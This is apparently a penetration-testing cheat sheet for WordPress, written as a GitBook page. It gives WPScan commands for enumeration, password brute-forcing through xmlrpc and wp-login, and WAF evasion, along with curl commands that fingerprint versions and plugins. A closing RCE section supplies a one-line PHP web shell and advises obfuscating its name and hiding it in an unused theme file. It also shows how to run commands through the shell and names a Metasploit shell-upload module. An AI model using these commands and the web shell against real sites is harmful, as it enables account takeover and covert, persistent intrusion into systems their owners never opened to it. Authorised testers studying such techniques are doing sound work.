---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# WordPress

## General Information

<details>

<summary>Directories</summary>

`/wp-admin` -> `/wp-login.php`

`/wp-content/plugins/`

`/wp-content/themes/`

</details>

<details>

<summary>Wordlists</summary>

[wordpress.fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wordpress.fuzz.txt)

[wp-plugins.fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt)

[wp-themes.fuzz.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wp-themes.fuzz.txt)

</details>

<details>

<summary>Roles &#x26; Permissions</summary>

Administrator -> King :crown:

Editor -> Post management + publish (for all users)

Author -> Post management + publish (owned posts)

Contributor -> Post management (owned posts)

Subscriber -> Browse posts, manage its own profile

</details>

## Automated Enumeration (WPScan)

{% hint style="info" %}
For vulnerability scanning get a token from [WPScan](https://wpscan.com/).
{% endhint %}

{% tabs %}
{% tab title="Update DB" %}
```bash
wpscan --update
```
{% endtab %}

{% tab title="Vulnerable Components" %}
```bash
sudo wpscan --url example.com --enumerate --api-token <TOKEN>
```
{% endtab %}

{% tab title="Brute-force" %}
<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># Enumerating users and brute-forcing
</strong><strong>sudo wpscan --url example.com -e u --passwords password.lst
</strong><strong># Targeted brute-forcing using xmlrpc
</strong>sudo wpscan --password-attack xmlrpc -t 20 --url http://example.com -U roger -P /usr/share/wordlists/rockyou
</code></pre>
{% endtab %}

{% tab title="WAF Evasion" %}
<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>sudo wpscan --url example.com --enumerate --api-token &#x3C;TOKEN> --random-user-agent
</strong></code></pre>
{% endtab %}
{% endtabs %}

WPScan uses 2 kinds of BFA:

1. [xmlrpc](https://kinsta.com/blog/xmlrpc-php/) -> uses WP's API to BF (`xmlrpc.php`) (this is faster)
2. wp-login -> attempts to BF `wp-login.php`

## Manual Enumeration

{% tabs %}
{% tab title="Version" %}
```bash
curl -s example.com | grep '<meta name="generator"'
```
{% endtab %}

{% tab title="Themes" %}
```bash
curl -s example.com | grep themes
```
{% endtab %}

{% tab title="Plugins" %}
```bash
curl -s example.com | grep plugins
```
{% endtab %}

{% tab title="Plugin Version*" %}
{% code overflow="wrap" %}
```bash
curl -s example.com/wp-content/plugins/mail-masta/readme.txt | grep "Stable tag:"
```
{% endcode %}
{% endtab %}
{% endtabs %}

\*_Plugin version requires Directory listing to be enabled._

## RCE

### Browser

A simple PHP web shell (obfuscate the file name).&#x20;

```php
<?php system($_GET['c']); ?>
```

Modify a less-used file of an inactive theme for avoiding breaking the site.

<figure><img src="../../../../.gitbook/assets/http_80_ir_webshell_process.png" alt=""><figcaption><p>Step for RCE after gaining admin access.</p></figcaption></figure>

Interact with the shell via CLI.

```bash
curl http://example.com/wp-content/themes/twentytwenty/404.php?c=id
```

### Metasploit

```bash
# launch metasploit
msfconsole -q
# use module (make sure to `set VHOST`)
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
```

## Resources

{% tabs %}
{% tab title="Repo" %}
{% embed url="https://github.com/wpscanteam/wpscan" %}
{% endtab %}

{% tab title="Wiki" %}
{% embed url="https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation" %}
{% endtab %}
{% endtabs %}
